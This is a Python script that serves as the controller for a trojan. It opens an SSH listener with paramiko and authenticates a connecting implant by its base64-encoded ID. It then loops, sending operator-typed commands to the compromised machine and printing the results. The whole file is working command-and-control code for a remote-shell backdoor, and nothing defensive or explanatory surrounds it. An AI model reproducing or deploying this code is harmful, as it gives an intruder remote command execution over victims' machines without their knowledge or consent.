#!/usr/bin/python

import socket
import paramiko
import threading
import sys
import base64
from Crypto.PublicKey import RSA

    
server = sys.argv[1]
ssh_port = int(sys.argv[2])
trojan_id = str(sys.argv[3])

with open("keys/ssh_server_key") as file_object: 
    host_key = paramiko.RSAKey(file_obj=file_object)
    file_object.close()
    
class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
    def check_auth_password(self, username, password):
        if (password == base64.b64encode(trojan_id)):
            print "[*] Connected to ID: %s" % username
            return paramiko.AUTH_SUCCESSFUL
        print "[!] Wrong password!"
        return paramiko.AUTH_FAILED
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind((server,ssh_port))
    sock.listen(100)    
    print '[*] Listening for connection from %s ...' % trojan_id
except Exception, e:
    print '[-] Listen failed: ' + str(e)
    sys.exit(1)
    
chan = None
while chan == None:
    try:
        client, addr = sock.accept()
    except KeyboardInterrupt:
        print '[-] Listening canceled. '
        sys.exit(1)
    
    print '[*] Connection from: %s:%d' % (addr[0], addr[1])
    
    try: 
        bhSession = paramiko.Transport(client)
        bhSession.add_server_key(host_key)
        server = Server()
        try:
            bhSession.start_server(server=server)
        except paramiko.SSHException, x:
            print '[-] SSH negotiation failed!'
           
        chan = bhSession.accept(20)
    except Exception, e:
        print '[-] Caught exception: ' + str(e)
        try:
            bhSession.close()
        except: 
            pass
        sys.exit(1)
    
try:
    print '[*] Authenticated!'
    while True:
        try:
            command = raw_input("Enter command: ").strip('\n')
            if command != 'exit':
                chan.send(command)
                print chan.recv(1024)
            else:
                chan.send('exit')
                print 'Exiting'
                bhSession.close()
                sys.exit(1)
        except KeyboardInterrupt:
            bhSession.close()
except Exception, e:
    print '[-] Caught exception: ' + str(e)
    try:
        bhSession.close()
    except: 
        pass
    sys.exit(1)
    
    
    